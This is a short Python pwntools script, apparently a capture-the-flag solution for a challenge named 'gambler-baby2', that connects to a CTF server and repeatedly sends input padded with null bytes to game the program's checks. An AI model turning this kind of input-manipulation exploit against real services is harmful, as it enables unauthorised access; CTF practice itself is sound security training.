from pwn import *

p = process('./gambler-baby2')
p = remote('ctf.b01lers.com', 9203)

while (True):
    data = b'A\0'*8+b'A\0'*8
    p.sendline(data)
    print(p.recvline())

p.interactive()
